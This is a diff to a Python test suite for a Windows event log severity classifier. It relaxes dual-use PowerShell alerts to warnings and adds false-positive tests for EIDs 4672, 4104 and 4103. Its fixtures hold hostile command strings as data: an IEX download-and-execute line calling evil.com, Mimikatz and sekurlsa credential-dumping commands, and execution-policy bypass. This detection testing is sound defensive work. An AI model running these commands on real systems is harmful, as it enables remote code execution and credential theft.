@@ -475,19 +475,19 @@ class TestNewEIDs:
         r = _parse_record_xml(xml)
         assert r["severity"] == "info"
 
-    def test_4104_scriptblock_iex_critical(self):
+    def test_4104_scriptblock_iex_warning(self):
         xml = self._xml(4104,
                         ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
                         Path="")
         r = _parse_record_xml(xml)
         assert r is not None
         assert r["event_action"] == "windows_powershell_scriptblock"
-        assert r["severity"] == "critical"
+        assert r["severity"] == "warning"
 
-    def test_4104_scriptblock_encodedcommand_critical(self):
+    def test_4104_scriptblock_encodedcommand_warning(self):
         xml = self._xml(4104, ScriptBlockText="powershell -EncodedCommand SGVsbG8=", Path="")
         r = _parse_record_xml(xml)
-        assert r["severity"] == "critical"
+        assert r["severity"] == "warning"
 
     def test_4104_scriptblock_normal_warning(self):
         xml = self._xml(4104, ScriptBlockText="Get-Date", Path="C:\\scripts\\check.ps1")
@@ -496,12 +496,12 @@ class TestNewEIDs:
         assert r["event_action"] == "windows_powershell_scriptblock"
         assert r["severity"] == "warning"
 
-    def test_4104_scriptblock_bypass_critical(self):
+    def test_4104_scriptblock_bypass_warning(self):
         xml = self._xml(4104,
                         ScriptBlockText="Set-ExecutionPolicy Bypass -Force",
                         Path="")
         r = _parse_record_xml(xml)
-        assert r["severity"] == "critical"
+        assert r["severity"] == "warning"
 
     # ── System kanalı ─────────────────────────────────────────────────
 
@@ -697,3 +697,157 @@ class TestNewEIDs:
         for action, stage in expected.items():
             assert STAGE_MAP.get(action) == stage, \
                 f"{action}: beklenen={stage}, bulunan={STAGE_MAP.get(action)}"
+
+
+# ------------------------------------------------------------------ #
+#  U2 — False Positive Azaltma Testleri
+# ------------------------------------------------------------------ #
+
+class TestU2FalsePositiveReduction:
+    """EID 4672 SeImpersonate FP + PowerShell keyword tier ayrımı."""
+
+    def _xml(self, eid: int, **fields) -> str:
+        return _make_xml(eid, **fields)
+
+    # ── EID 4672 — SeImpersonatePrivilege FP düzeltmesi ──────────────
+
+    def test_4672_seimpersonate_alone_is_warning_not_critical(self):
+        """SeImpersonatePrivilege tek başına → warning (IIS/SQL Server meşru)."""
+        xml = self._xml(4672, SubjectUserName="IIS APPPOOL\\DefaultAppPool",
+                        PrivilegeList="SeImpersonatePrivilege\nSeChangeNotifyPrivilege")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "warning"
+
+    def test_4672_sedebug_normal_user_still_critical(self):
+        """SeDebugPrivilege normal kullanıcıda → hâlâ critical."""
+        xml = self._xml(4672, SubjectUserName="attacker",
+                        PrivilegeList="SeDebugPrivilege\nSeImpersonatePrivilege")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "critical"
+
+    def test_4672_setcb_normal_user_critical(self):
+        """SeTcbPrivilege normal kullanıcıda → critical."""
+        xml = self._xml(4672, SubjectUserName="malware_proc",
+                        PrivilegeList="SeTcbPrivilege")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "critical"
+
+    def test_4672_nt_service_account_is_system(self):
+        """NT SERVICE\\ prefix → is_system=True → info."""
+        xml = self._xml(4672, SubjectUserName="NT SERVICE\\WinDefend",
+                        PrivilegeList="SeImpersonatePrivilege\nSeDebugPrivilege")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "info"
+
+    def test_4672_nt_authority_is_system(self):
+        """NT AUTHORITY\\ prefix → is_system=True → info."""
+        xml = self._xml(4672, SubjectUserName="NT AUTHORITY\\SYSTEM",
+                        PrivilegeList="SeDebugPrivilege")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "info"
+
+    def test_4672_window_manager_is_system(self):
+        """WINDOW MANAGER\\ prefix → is_system=True → info."""
+        xml = self._xml(4672, SubjectUserName="WINDOW MANAGER\\DWM-1",
+                        PrivilegeList="SeImpersonatePrivilege")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "info"
+
+    def test_4672_machine_account_is_system(self):
+        """Computer account ($ suffix) → is_system=True → info."""
+        xml = self._xml(4672, SubjectUserName="CORP-DC$",
+                        PrivilegeList="SeImpersonatePrivilege")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "info"
+
+    # ── EID 4104 — PowerShell keyword tier ayrımı ────────────────────
+
+    def test_4104_invoke_mimikatz_is_critical(self):
+        """invoke-mimikatz → _PS_CRITICAL_KEYWORDS → critical."""
+        xml = self._xml(4104,
+                        ScriptBlockText="invoke-Mimikatz -DumpCreds",
+                        Path="")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "critical"
+
+    def test_4104_encodedcommand_dual_use_is_warning(self):
+        """-encodedcommand dual-use → warning (eski: critical)."""
+        xml = self._xml(4104,
+                        ScriptBlockText="powershell.exe -EncodedCommand SGVsbG8gV29ybGQ=",
+                        Path="")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "warning"
+
+    def test_4104_invoke_expression_dual_use_is_warning(self):
+        """invoke-expression dual-use → warning (Windows Defender gibi araçlarda meşru)."""
+        xml = self._xml(4104,
+                        ScriptBlockText="Invoke-Expression $scriptContent",
+                        Path="C:\\ProgramData\\defender\\scan.ps1")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "warning"
+
+    def test_4104_normal_script_is_warning(self):
+        """Tehdit içermeyen script → varsayılan warning."""
+        xml = self._xml(4104,
+                        ScriptBlockText="Get-Service | Where-Object {$_.Status -eq 'Running'}",
+                        Path="C:\\scripts\\monitor.ps1")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "warning"
+
+    def test_4104_sekurlsa_is_critical(self):
+        """sekurlsa → _PS_CRITICAL_KEYWORDS → critical."""
+        xml = self._xml(4104,
+                        ScriptBlockText="sekurlsa::logonpasswords",
+                        Path="")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "critical"
+
+    def test_4104_bypass_dual_use_is_warning(self):
+        """bypass → dual-use keyword → warning (scheduled task gibi scriptlerde meşru)."""
+        xml = self._xml(4104,
+                        ScriptBlockText="powershell -ExecutionPolicy Bypass -File C:\\deploy\\setup.ps1",
+                        Path="")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "warning"
+
+    # ── EID 4103 — PowerShell Module kanal tutarlılığı ───────────────
+
+    def test_4103_invoke_mimikatz_critical(self):
+        """invoke-mimikatz → 4103'te de critical kalmalı."""
+        xml = self._xml(4103,
+                        Payload="invoke-Mimikatz -DumpCreds -ComputerName target",
+                        HostApplication="powershell.exe")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "critical"
+
+    def test_4103_downloadstring_warning(self):
+        """downloadstring → dual-use → warning (eski: critical)."""
+        xml = self._xml(4103,
+                        Payload="(New-Object Net.WebClient).DownloadString('http://repo/module.ps1')",
+                        HostApplication="powershell.exe")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "warning"
+
+    def test_4103_normal_payload_info(self):
+        """Normal payload → info."""
+        xml = self._xml(4103,
+                        Payload="Get-ChildItem C:\\Windows\\System32",
+                        HostApplication="powershell.exe")
+        r = _parse_record_xml(xml)
+        assert r is not None
+        assert r["severity"] == "info"
